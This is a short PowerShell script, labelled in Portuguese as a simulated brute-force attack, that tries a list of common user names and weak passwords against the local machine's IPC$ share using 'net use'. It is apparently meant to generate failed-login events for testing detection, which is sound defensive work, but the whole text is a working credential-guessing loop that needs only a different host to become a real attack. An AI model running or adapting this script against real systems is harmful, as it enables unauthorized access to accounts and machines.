BRUTE FORCE:

$usuarios = @("Administrator", "administrador", "admin", "suporte", "root", "guest")

$senhas = @("123456", "password", "senha123", "admin123", "mudar123", "qwerty", "init123", "windows")

Write-Host "[!] Iniciando simulação de ataque de Força Bruta..." -ForegroundColor Yellow

foreach ($user in $usuarios) {
    foreach ($senha in $senhas) {
        $cmd = "net use \\127.0.0.1\IPC$ /user:$user $senha 2>&1"
        Invoke-Expression $cmd | Out-Null
        Write-Host "[-] Tentativa: $user | Senha: $senha" -ForegroundColor Gray
    }
}